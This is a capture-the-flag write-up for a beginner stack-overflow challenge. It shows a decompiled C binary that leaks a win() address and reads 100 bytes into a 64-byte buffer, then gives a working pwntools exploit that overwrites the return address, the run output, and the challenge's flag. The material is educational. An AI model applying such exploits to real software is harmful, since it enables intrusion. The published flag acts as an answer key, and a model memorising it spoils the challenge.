# crowd-bike-updater

[library.m0unt41n.ch/challenges/crowd-bike-updater](https://library.m0unt41n.ch/challenges/crowd-bike-updater) ![](../../resources/pwn.svg) ![](../../resources/baby.svg) 

# TL;DR

We get a C binary, which asks for "log details":

```
Debug info - we crashed last time so we're making sure this function exists: 0x401196
CrowdStrike Antivirus - Update Version 3.14
Critical Update: Patching security vulnerabilities...
Antivirus Update Log System
Enter log details:
krkr
Log saved: krkr

Update completed successfully.
```

# Decompilation

```
$ checksec --file=updater
RELRO   STACK CANARY NX  PIE  RPATH  RUNPATH
Partial No canary    No  No   No     No
```

Decompilation with IDA is fairly straightforward:

```c
void win() {
  int msgLen; // [rsp+8h] [rbp-18h]
  int flagLen; // [rsp+Ch] [rbp-14h]
  const char *flag; // [rsp+18h] [rbp-8h]

  flag = getenv("FLAG");
  if ( !flag ) {
    puts("FLAG is not set, please contact the administrator");
    exit(1);
  }
  flagLen = strlen(flag);
  msgLen = strlen("Security breach detected! You've uncovered the secret flag:\n");
  fwrite("Security breach detected! You've uncovered the secret flag:\n", 1uLL, msgLen, stdout);
  fwrite(flag, 1uLL, flagLen, stdout);
  exit(0);
}

int log_update_details() {
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF
  puts("Antivirus Update Log System");
  puts("Enter log details:");
  fgets(buf, 100, stdin);
  return printf("Log saved: %s\n", buf);
}

int main(int argc, const char **argv, const char **envp) {
  setbuf(stdout, 0LL);
  printf("Debug info - we crashed last time so we're making sure this function exists: %p\n", win);
  puts("CrowdStrike Antivirus - Update Version 3.14");
  puts("Critical Update: Patching security vulnerabilities...");
  log_update_details();
  puts("Update completed successfully.");
  return 0;
}
```

# Vulnerability

The program leaks the address of `win()` function. Then, the
`log_update_details()` function has a `fgets()` with a limit of 100
bytes, while the buffer is just 64 bytes. Combined with no stack canary,
this is indeed a `baby` exercise in stack exploitation.

The payload needed

*   64 bytes for buffer
*   8 bytes for RBP
*   Address of `win()` function, which we can intercept from initial dialog

# Exploit

```python
import pwn
pwn.context(arch='amd64', os='linux')

io = pwn.process("./updater")
io.recvuntilS(b"making sure this function exists: ")
s = io.recvlineS()
win = int(s, 16)
payload = b'A'*64+b'B'*8+pwn.p64(win)
io.recvuntilS(b"Enter log details:\n")
io.sendline(payload)
io.interactive()
```

```
$ export FLAG=flag{test_flag}
$ ./exploit.py
[+] Starting local process './updater': pid 171203
[*] Switching to interactive mode
[*] Process './updater' stopped with exit code 0 (pid 171203)
Log saved: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x96\x11@
Security breach detected! You've uncovered the secret flag:
flag{test_flag}[*] Got EOF while reading in interactive
$ ls
[*] Got EOF while sending in interactive
```

This works for remote instance too.

---

## `SCD{uwu_h3lp_upd4t3r_1s_stuck}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
